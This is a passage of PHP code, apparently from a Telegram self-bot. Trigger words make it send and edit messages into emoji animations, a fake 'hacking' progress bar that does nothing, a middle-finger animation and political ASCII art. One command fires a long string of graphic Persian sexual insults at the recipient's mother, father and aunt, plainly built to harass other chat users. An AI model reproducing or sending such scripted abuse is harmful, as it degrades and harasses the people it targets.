                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥🟥🟥🟥
🟥💚💚💚💚💚🟥
🟥💙💙💙💙💙🟥
🟥❤️❤️❤️❤️❤️🟥
🟥💖💖💖💖💖🟥
🟥🤍🤍🤍🤍🤍🟥
🟥🟥🟥🟥🟥🟥🟥']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥🟥🟥🟥
🟥▫️◼️▫️◼️▫️🟥
🟥◼️▫️◼️▫️◼️🟥
🟥◽️◼️◽️◼️◽️🟥
🟥◼️◽️◼️◽️◼️🟥
🟥◽️◼️◽️◼️◽️🟥
🟥🟥🟥🟥🟥🟥🟥']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥🟥🟥🟥
🟥🔶🔷🔶🔷🔶🟥
🟥🔷🔶🔷🔶🔷🟥
🟥🔶🔷🔶🔷🔶🟥
🟥🔷🔶🔷🔶🔷🟥
🟥🔶🔷🔶🔷🔶🟥
🟥🟥🟥🟥🟥🟥🟥']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥🟥🟥🟥
🟥♥️❤️♥️❤️♥️🟥
🟥❤️♥️❤️♥️❤️🟥
🟥♥️❤️♥️❤️♥️🟥
🟥❤️♥️❤️♥️❤️🟥
🟥♥️❤️♥️❤️♥️🟥
🟥🟥🟥🟥🟥🟥🟥']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💙💙💙💙']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '❗️EnD ❗️']);
                    }

                    if ($text == 'مربع' or $text == 'mr') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '🟥🟥🟥🟥
🟥🟥🟥🟥
🟥🟥🟥🟥
🟥🟥🟥🟥']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥
🟥⬜️⬛️🟥
🟥⬛️⬜️🟥
🟥🟥🟥🟥']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥
🟥⬛️⬜️🟥
🟥⬜️⬛️🟥
🟥🟥🟥🟥']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥⬛️
🟥⬜️⬛️🟥
🟥⬛️⬜️🟥
⬛️🟥🟥🟥']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥⬜️⬛️🟥
🟥⬛️⬜️🟥
🟥⬜️⬛️🟥
🟥⬛️⬜️🟥']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥⬛️⬜️🟥
🟥⬜️⬛️🟥
🟥⬛️⬜️🟥
🟥⬜️⬛️🟥']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '⬜️⬛️⬜️⬛️
⬛️⬜️⬛️⬜️
⬜️⬛️⬜️⬛️
⬛️⬜️⬛️⬜️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '⬛️⬜️⬛️⬜️
⬜️⬛️⬜️⬛️
⬛️⬜️⬛️⬜️
⬜️⬛️⬜️⬛️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥⬜️⬛️⬜️🟥
🟥⬛️⬜️⬛️🟥
🟥⬜️⬛️⬜️🟥
🟥⬛️⬜️⬛️🟥
🟥⬜️⬛️⬜️🟥']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥🟥🟥🟥
🟥🟨🟨🟨🟨🟨🟥
🟥🟩🟩🟩🟩🟩🟥
🟥⬛️⬛️⬛️⬛️⬛️🟥
🟥🟦🟦🟦🟦🟦🟥
🟥⬜️⬜️⬜️⬜️⬜️🟥
🟥🟥🟥🟥🟥🟥🟥']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥🟥🟥🟥
🟥💚💚💚💚💚🟥
🟥💙💙💙💙💙🟥
🟥❤️❤️❤️❤️❤️🟥
🟥💖💖💖💖💖🟥
🟥🤍🤍🤍🤍🤍🟥
🟥🟥🟥🟥🟥🟥🟥']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥🟥🟥🟥
🟥▫️◼️▫️◼️▫️🟥
🟥◼️▫️◼️▫️◼️🟥
🟥◽️◼️◽️◼️◽️🟥
🟥◼️◽️◼️◽️◼️🟥
🟥◽️◼️◽️◼️◽️🟥
🟥🟥🟥🟥🟥🟥🟥']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥🟥🟥🟥
🟥🔶🔷🔶🔷🔶🟥
🟥🔷🔶🔷🔶🔷🟥
🟥🔶🔷🔶🔷🔶🟥
🟥🔷🔶🔷🔶🔷🟥
🟥🔶🔷🔶🔷🔶🟥
🟥🟥🟥🟥🟥🟥🟥']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥🟥🟥🟥
🟥♥️❤️♥️❤️♥️🟥
🟥❤️♥️❤️♥️❤️🟥
🟥♥️❤️♥️❤️♥️🟥
🟥❤️♥️❤️♥️❤️🟥
🟥♥️❤️♥️❤️♥️🟥
🟥🟥🟥🟥🟥🟥🟥']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💙💙💙💙']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '|تــــــــــــــــامـــــــــــــام|']);

                    }
                    if ($text == 'coder' or $text == 'creator' or $text == 'سازنده') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => " 👑 рαwηCøÐeƦ 👑"]);
                    }
                    if ($text == 'emam' or $text == 'مرگ بر امریکا') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '⣿⣿⣿⣿⣿⡿⠋⠁⠄⠄⠄⠈⠘⠩⢿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⠃⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠻⣿⣿⣿⣿
⣿⣿⣿⣿⠄⠄⣀⣤⣤⣤⣄⡀⠄⠄⠄⠄⠙⣿⣿⣿
⣿⣿⣿⣿⡀⢰⣿⣿⣿⣿⣿⢿⠄⠄⠄⠄⠄⠹⢿⣿
⣿⣿⣿⣿⣿⡞⠻⠿⠟⠋⠉⠁⣤⡀⠄⠄⠄⠄⠄⠄
⣿⣿⣿⣿⣿⣿⣶⢼⣷⡤⣦⣿⠛⡰⢃⠄⠐⠄⠄⢸
⣿⣿⣿⣿⣿⣿⣿⡯⢍⠿⢾⡿⣸⣿⠰⠄⢀⠄⠄⡬
⣿⣿⣿⣿⣿⣿⣿⣴⣴⣅⣾⣿⣿⡧⠦⡶⠃⠄⠠⢴
⣿⣿⣿⣿⠿⠍⣿⣿⣿⣿⣿⣿⣿⢇⠟⠁⠄⠄⠄⠄
⠟⠛⠉⠄⠄⠄⡽⣿⣿⣿⣿⣿⣯⠏⠄⠄⠄⠄⠄⠄
⠄⠄⠄⢀⣾⣾⣿⣤⣯⣿⣿⡿⠃⠄⠄⠄⠄⠄⠄ ']);
                    }
                    if ($text == 'هک کردن' or $text == 'hacking') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'تارگت مشخص شد']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'درحال اجرای اسکریپت هک کردن!']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'اسکریپت هک کردن اجرا شد ، درحال هک کردن!']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 3, 'message' => '10%']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 3, 'message' => '26%']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 3, 'message' => '47%']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 3, 'message' => '59%']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 3, 'message' => '66%']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 3, 'message' => '78%']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 3, 'message' => '83%']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 3, 'message' => '92%']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 3, 'message' => '97%']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 3, 'message' => '100%']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 3, 'message' => '💻 تارگت هک شد 📱']);
                    }
                    if ($text == 'چرخش' or $text == 'charkhesh') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '🟨🟨🟨🟨🟨
🟨🟨🟨🟨🟨
🟨▫▫▫🟨
🟨🟨🟨🟨🟨
🟨🟨🟨🟨🟨']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥🟥
🟥🟥▫🟥🟥
🟥🟥▫🟥🟥
🟥🟥▫🟥🟥
🟥🟥🟥🟥🟥']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟩🟩🟩🟩🟩
🟩▫🟩🟩🟩
🟩🟩▫🟩🟩
🟩🟩🟩▫🟩
🟩🟩🟩🟩🟩']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧
🟧▫▫▫🟧
🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟦🟦🟦🟦🟦
🟦🟦🟦▫🟦
🟦🟦▫🟦🟦
🟦▫🟦🟦🟦
🟦🟦🟦🟦🟦']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟪🟪🟪🟪🟪
🟪🟪▫🟪🟪
🟪🟪▫🟪🟪
🟪🟪▫🟪🟪
🟪🟪🟪🟪🟪']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟫🟫🟫🟫🟫
🟫▫🟫🟫🟫
🟫🟫▫🟫🟫
🟫🟫🟫▫🟫
🟫🟫🟫🟫🟫']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '◻◻◻◻◻
◻◻◻◻◻
◻◾◾◾◻
◻◻◻◻◻
◻◻◻◻◻']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥🟥
🟥🟥▫🟥🟥
🟥🟥▫🟥🟥
🟥🟥▫🟥🟥
🟥🟥🟥🟥🟥']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥🟥
🟥🟥▫🟥🟥
🟥▫▫▫🟥
🟥🟥▫🟥🟥
🟥🟥🟥🟥🟥']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥▫
🟥🟥▫▫🟥
🟥▫▫▫🟥
🟥▫▫🟥🟥
▫🟥🟥🟥🟥']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '▫▫▫▫▫
🟥🟥▫▫🟥
🟥▫▫▫🟥
🟥▫▫🟥🟥
▫▫▫▫▫']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '▫▫▫▫▫
▫▫▫▫▫
▫▫▫▫▫
▫▫▫▫▫
▫▫▫▫▫']);
                    }
                    if ($text == 'ساعت' or $text == 'clock') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '🕛🕛🕛🕛🕛
🕛🕛🕛🕛🕛
🕛🕛🕛🕛🕛
🕛🕛🕛🕛🕛
🕛🕛🕛🕛🕛']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🕐🕐🕐🕐🕐
🕐🕐🕐🕐🕐
🕐🕐🕐🕐🕐
🕐🕐🕐🕐🕐
🕐🕐🕐🕐🕐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🕑🕑🕑🕑🕑
🕑🕑🕑🕑🕑
🕑🕑🕑🕑🕑
🕑🕑🕑🕑🕑
🕑🕑🕑🕑🕑']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🕒🕒🕒🕒🕒
🕒🕒🕒🕒🕒
🕒🕒🕒🕒🕒
🕒🕒🕒🕒🕒
🕒🕒🕒🕒🕒']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🕔🕔🕔🕔🕔
🕔🕔🕔🕔🕔
🕔🕔🕔🕔🕔
🕔🕔🕔🕔🕔
🕔🕔🕔🕔🕔']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🕕🕕🕕🕕🕕
🕕🕕🕕🕕🕕
🕕🕕🕕🕕🕕
🕕🕕🕕🕕🕕
🕕🕕🕕🕕🕕']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🕖🕖🕖🕖🕖
🕖🕖🕖🕖🕖
🕖🕖🕖🕖🕖
🕖🕖🕖🕖🕖
🕖🕖🕖🕖🕖']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🕗🕗🕗🕗🕗
🕗🕗🕗🕗🕗
🕗🕗🕗🕗🕗
🕗🕗🕗🕗🕗
🕗🕗🕗🕗🕗']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🕙🕙🕙🕙🕙
🕙🕙🕙🕙🕙
🕙🕙🕙🕙🕙
🕙🕙🕙🕙🕙
🕙🕙🕙🕙🕙']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🕚🕚🕚🕚🕚
🕚🕚🕚🕚🕚
🕚🕚🕚🕚🕚
🕚🕚🕚🕚🕚
🕚🕚🕚🕚🕚']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🕛🕛🕛🕛🕛
🕛🕛🕛🕛🕛
🕛🕛🕛🕛🕛
🕛🕛🕛🕛🕛
🕛🕛🕛🕛🕛']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '⏰⏰⏰⏰⏰']);
                    }

                    if ($text == 'بکنش' or $text == 'کونش بزار') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'پاون کدر گاییدت']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'فاضلاب شمال شرق تهران تو کص ننت']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'کیر گراز وحشی تو مادرت']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'اونجا که شاعر میگه یه کیر دارم شاه نداره تو ننت']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'پایه تختم تو کونت']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'کلا کص ننت']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'الکی بی دلیل کص ننت']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'بابات چه ورقیه']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'دست زدم به کون بابات دلم رفت']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'به بابات بگو سفید کنه شب میام بکنم']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'کص ننت؟']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'ایمیل عمتو لطف کن']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'کوننده خونه ای که عمت توش پول درمیاره نوشتم رو کیرم']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'کص ننت']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'کص پدرت']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'یه فرزند جدید داری پاون کدر']);
                    }
                    if ($text == 'فاک' or $text == 'fuck') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '🖕🏿🖕🖕🖕🖕🖕']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🖕🖕🏿🖕🖕🖕🖕']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🖕🖕🖕🏿🖕🖕🖕']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🖕🖕🖕🖕🏿🖕🖕']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🖕🖕🖕🖕🖕🏿🖕']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🖕🖕🖕🖕🖕🖕🏿']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🖕🖕🖕🖕🖕🏿🖕']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🖕🖕🖕🖕🏿🖕🖕']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🖕🖕🖕🏿🖕🖕🖕']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🖕🖕🏿🖕🖕🖕🖕']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🖕🏿🖕🖕🖕🖕🖕']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🖕🖕🏿🖕🖕🏿🖕🖕🏿']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🖕🏿🖕🖕🏿🖕🖕🏿🖕']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🖕🖕🖕🖕🖕🖕']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🖕🏿🖕🏿🖕🏿🖕🏿🖕🏿🖕🏿']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '☘ӺƲҀҞΪƝǤ ƳѲƲ☘']);
                    }
                    if ($text == 'رقص' or $text == 'danc') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥
🟥🔲🔳🔲🟥
🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥🟥
🟥🟥🔲🟥🟥
🟥🟥🔳🟥🟥
🟥🟥🔲🟥🟥
🟥🟥🟥🟥🟥']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥🟥
🟥🟥🟥🔲🟥
🟥🟥🔳🟥🟥
🟥🔲🟥🟥🟥
🟥🟥🟥🟥🟥']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥🟥
🟥🔲🟥🟥🟥
🟥🟥🔳🟥🟥
🟥🟥🟥🔲🟥
🟥🟥🟥🟥🟥']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟪🟪🟪🟪🟪
🟪🟪🟪🟪🟪
🟪🔲🔳🔲🟪
🟪🟪🟪🟪🟪
🟪🟪🟪🟪🟪']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟪🟪🟪🟪🟪
🟪🟪🔲🟪🟪
🟪🟪🔳🟪🟪
🟪🟪🔲🟪🟪
🟪🟪🟪🟪🟪']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟪🟪🟪🟪🟪
🟪🟪🟪🔲🟪
🟪🟪🔳🟪🟪
🟪🔲🟪🟪🟪
🟪🟪🟪🟪🟪']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟪🟪🟪🟪🟪
🟪🔲🟪🟪🟪
🟪🟪🔳🟪🟪
🟪🟪🟪🔲🟪
🟪🟪🟪🟪🟪']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟦🟦🟦🟦🟦
🟦🟦🟦🟦🟦
🟦🔲🔳🔲🟦
🟦🟦🟦🟦🟦
🟦🟦🟦🟦🟦']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟦🟦🟦🟦🟦
🟦🟦🔲🟦🟦
🟦🟦🔳🟦🟦
🟦🟦🔲🟦🟦
🟦🟦🟦🟦🟦']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟦🟦🟦🟦🟦
🟦🟦🟦🔲🟦
🟦🟦🔳🟦🟦
🟦🔲🟦🟦🟦
🟦🟦🟦🟦🟦']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟦🟦🟦🟦🟦
🟦🔲🟦🟦🟦
🟦🟦🔳🟦🟦
🟦🟦🟦🔲🟦
🟦🟦🟦🟦🟦']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '◻️🟩🟩◻️◻️
◻️◻️🟩◻️🟩
🟩🟩🔳🟩🟩
🟩◻️🟩◻️◻️
◻️◻️🟩🟩◻️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟩⬜️⬜️🟩🟩
🟩🟩⬜️🟩⬜️
⬜️⬜️🔲⬜️⬜️
⬜️🟩⬜️🟩🟩
🟩🟩⬜️⬜️🟩']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '▫️▫️▫️▫️▫️
▫️▫️▫️▫️▫️
▫️▫️▫️▫️▫️
▫️▫️▫️▫️▫️
▫️▫️▫️▫️▫️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '☘تـــــــــــــــامـــــــــــام☘']);
                    }
                    if ($text == 'خار' or $text == 'کاکتوس') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '🌵ــــــــــــــــــــــــــــــــــــــــ 🎈']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🌵ــــــــــــــــــــــــــــــــــــــــ🎈']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🌵ـــــــــــــــــــــــــــــــــــــــ🎈']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🌵ــــــــــــــــــــــــــــــــــــــ🎈']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🌵ـــــــــــــــــــــــــــــــــــــ🎈']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🌵ــــــــــــــــــــــــــــــــــــ🎈']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🌵ـــــــــــــــــــــــــــــــــــ🎈']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🌵ــــــــــــــــــــــــــــــــــ🎈']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🌵ـــــــــــــــــــــــــــــــــ🎈']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🌵ــــــــــــــــــــــــــــــــ🎈']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🌵ـــــــــــــــــــــــــــــــ🎈']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🌵ــــــــــــــــــــــــــــــ🎈']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🌵ـــــــــــــــــــــــــــــ🎈']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🌵ــــــــــــــــــــــــــــ🎈']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🌵ــــــــــــــــــــــــــ🎈']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🌵ـــــــــــــــــــــــــ🎈']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🌵ــــــــــــــــــــــ🎈']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🌵ـــــــــــــــــــــ🎈']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🌵ـــــــــــــــــــ🎈']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🌵ـــــــــــــــــ🎈']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🌵ـــــــــــــــ🎈']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🌵ــــــــــــ🎈']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🌵ــــــــــ🎈']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🌵ـــــــــ🎈']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🌵ــــــــ🎈']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🌵ــــــ🎈']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🌵ــــ🎈']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🌵ـــ🎈']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🌵ــ🎈']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🌵ـ🎈']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🌵💥🎈']);
                        yield
                        $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💥Bommmm💥']);
                    }
                    if ($text == 'رقص مربع' or $text == 'دنس') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
